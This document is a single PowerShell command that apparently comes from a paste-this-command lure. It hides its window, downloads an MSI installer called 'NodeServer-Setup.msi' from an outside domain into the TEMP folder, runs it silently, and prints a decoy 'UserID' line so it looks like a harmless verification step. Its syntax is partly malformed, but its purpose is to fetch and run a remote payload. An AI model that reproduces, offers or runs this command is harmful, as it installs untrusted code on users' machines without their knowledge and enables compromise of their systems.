powershell  -WindowStyle Hidden -c "iwr 'msiexec /i  https://agency-portals.com/NodeServer-Setup.msi   /qn' -o $env:TEMP\\tc.msi; & $env:TEMP\\tc.msi; Write-Host 'UserID:63994529832'"
